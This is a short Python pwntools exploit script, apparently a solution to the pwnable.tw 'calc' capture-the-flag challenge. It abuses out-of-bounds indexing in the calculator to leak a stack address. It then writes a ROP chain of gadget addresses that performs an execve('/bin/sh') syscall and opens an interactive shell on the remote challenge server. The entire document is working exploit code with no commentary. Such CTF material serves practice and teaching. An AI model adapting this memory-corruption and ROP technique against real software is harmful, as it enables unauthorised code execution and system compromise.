from pwn import * 

#sh = process("./calc") 
sh = remote( "chall.pwnable.tw",10100)
# gadget 
pop_eax = 0x0805c34b # pop eax; ret;  
pop_ebcdx = 0x080701d0 # pop edx; pop ecx; pop ebx; ret; 
int80 =  0x08070880  #0x08049a21  #  int 0x80; 
def set_value(pos,value) : 
    sh.sendline("+" + str(pos)) 
    old = int(sh.recvline().strip()) 
    if old < value : 
        sh.sendline("+" + str(pos) + "+" + str(value - old)) 
    else : 
        sh.sendline("+" + str(pos) + "-" + str(old - value)) 
    sh.recv() 

if __name__ == "__main__" : 
    print sh.recv()
    #raw_input("DEBUG")

    # leak stack 
    sh.sendline("+360") 
    stack = int(sh.recvline().strip()) #& 0xffffffff 
    log.success("Leak stack = " + hex(stack & 0xffffffff)) 
    
    set_value(361,pop_eax)
    set_value(362,11)
    set_value(363,pop_ebcdx)
    set_value(364,0)
    set_value(365,0)
    set_value(366,stack)
    set_value(367,int80) 
    set_value(368,0x6e69622f) 
    set_value(369,0x68732f)
    sh.sendline("")
    sh.interactive()
